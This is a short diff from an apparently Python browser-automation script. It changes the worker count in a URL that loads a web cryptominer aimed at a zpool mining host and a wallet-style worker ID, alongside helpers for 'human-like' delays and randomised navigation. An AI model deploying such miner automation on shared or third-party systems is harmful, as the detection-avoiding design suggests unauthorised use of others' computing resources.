@@ -57,7 +57,7 @@ try:
         time.sleep(random.uniform(min, max))
     
     # Navigate to URL with random query parameters
-    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=32"
+    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=4"
     driver.get(base_url)
     human_like_delay()
 
